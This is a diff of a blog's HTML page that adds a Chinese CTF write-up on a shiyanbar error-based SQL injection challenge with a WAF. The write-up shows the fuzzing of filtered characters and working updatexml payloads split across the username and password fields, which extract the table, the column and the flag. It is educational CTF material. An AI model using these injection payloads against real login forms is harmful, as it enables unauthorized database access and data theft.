@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="CTF,Web安全,">
 
 
 
@@ -79,13 +79,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Chen&#39;s Bolg">
-<meta property="og:url" content="http://yoursite.com/tags/Web安全/index.html">
+<meta name="description" content="题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39; and password=&amp;#39;$password&amp;#39;&amp;quot">
+<meta name="keywords" content="CTF,Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF题目-加了料的报错注入">
+<meta property="og:url" content="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/index.html">
 <meta property="og:site_name" content="Chen&#39;s Bolg">
+<meta property="og:description" content="题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39; and password=&amp;#39;$password&amp;#39;&amp;quot">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/1.png">
+<meta property="og:updated_time" content="2019-08-29T08:05:50.162Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Chen&#39;s Bolg">
+<meta name="twitter:title" content="CTF题目-加了料的报错注入">
+<meta name="twitter:description" content="题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39; and password=&amp;#39;$password&amp;#39;&amp;quot">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/2.png">
 
 
 
@@ -115,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/Web安全/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/">
 
 
 
 
 
-  <title>标签: Web安全 | Chen's Bolg</title>
+  <title>CTF题目-加了料的报错注入 | Chen's Bolg</title>
   
 
 
@@ -140,7 +148,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -266,234 +274,223 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block tag">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Web安全<small>标签</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen DY">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen's Bolg">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/08/29/CTF题目-加了料的报错注入/" itemprop="url">
-              
-                <span itemprop="name">CTF题目-加了料的报错注入</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">CTF题目-加了料的报错注入</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-29T16:03:21+08:00" content="2019-08-29">
-          08-29
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T16:03:21+08:00">
+                2019-08-29
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  698字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/08/29/文件上传的简单介绍/" itemprop="url">
-              
-                <span itemprop="name">文件上传的简单介绍</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-29T15:20:39+08:00" content="2019-08-29">
-          08-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
+        <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2011" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2011</a></p>
+<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。</p>
+<p>进入网页解题，源码部分给出了查询数据库的命令，为<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></p>
+<p>同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为<code>username=1+&amp;+password=1</code>，发送后网页端返回<code>Login failed</code></p>
+<p>尝试使用<code>username=&#39; or 1=1 %23&amp;password=1</code>进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同</p>
+<p>首先对于username，分析结果如下图所示：</p>
+<img src="/2019/08/29/CTF题目-加了料的报错注入/2.png">
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<p>由返回长度可以知道信息，其中302是<code>Login failed</code>，238是<code>Sql injection detected</code>，235是<code>username unknow error</code>对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml</p>
+<p>对于password，分析结果如下：</p>
+<img src="/2019/08/29/CTF题目-加了料的报错注入/1.png">
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/09/CTF题目-哈希长度拓展攻击/" itemprop="url">
-              
-                <span itemprop="name">CTF题目-哈希长度拓展攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-09T15:58:19+08:00" content="2019-07-09">
-          07-09
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/05/SQLMAP的使用/" itemprop="url">
-              
-                <span itemprop="name">SQLMAP的使用</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-05T16:34:08+08:00" content="2019-07-05">
-          07-05
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/02/SQL注入的总结和小技巧/" itemprop="url">
-              
-                <span itemprop="name">SQL注入的总结和小技巧</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-02T12:24:01+08:00" content="2019-07-02">
-          07-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/02/文件包含的简单介绍/" itemprop="url">
-              
-                <span itemprop="name">文件包含的简单介绍</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-02T11:16:25+08:00" content="2019-07-02">
-          07-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/06/30/XSS跨站脚本攻击/" itemprop="url">
-              
-                <span itemprop="name">XSS跨站脚本攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-06-30T15:06:34+08:00" content="2019-06-30">
-          06-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/06/27/SQL注入总结/" itemprop="url">
-              
-                <span itemprop="name">SQL注入总结</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-06-27T14:23:53+08:00" content="2019-06-27">
-          06-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+<p>和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句</p>
+<p>构造语句<code>username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;</code>发现返回的语句并没有解析user()，而是原样报错返回了</p>
+<p>尝试使用updatexml构造语句<code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;</code>，可以发现网页返回了用户名<code>web8@localhost</code></p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>得到payload就可以开始注入了，首先构造一句话来得到表名字：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;</code><br>结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39;</code></p>
+<p>网页返回结果为<code>XPATH syntax error: &#39;:ffll44jj,users&#39;</code><br>因此成功得到表名为<code>ffll44jj</code></p>
+<p>接下来尝试获取字段名，同样的方法，构造语句：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39;</code></p>
+<p>网页成功返回<code>XPATH syntax error: &#39;:value&#39;</code><br>由此得知flag所在列的名称为value</p>
+<p>再次构造命令来获取列中的值：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39;</code></p>
+<p>然后就可以成功得到flag为<code>XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;</code></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/29/文件上传的简单介绍/" rel="next" title="文件上传的简单介绍">
+                <i class="fa fa-chevron-left"></i> 文件上传的简单介绍
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -501,6 +498,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -521,8 +522,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -584,6 +594,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#尝试"><span class="nav-number">1.</span> <span class="nav-text">尝试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解"><span class="nav-number">3.</span> <span class="nav-text">破解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -729,6 +755,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
